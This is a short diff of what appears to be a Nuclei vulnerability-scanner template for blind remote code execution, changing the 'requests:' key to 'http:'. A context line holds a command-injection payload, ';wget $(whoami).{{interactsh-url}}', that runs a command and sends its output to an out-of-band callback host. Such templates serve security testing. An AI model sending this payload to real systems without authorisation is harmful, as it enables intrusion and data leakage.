@@ -7,7 +7,7 @@ info:
   description: Blind RCE
   tags: rce,jndi,oast,blind
 
-requests:
+http:
   - raw:
       - |
         GET /;wget $(whoami).{{interactsh-url}} HTTP/1.1
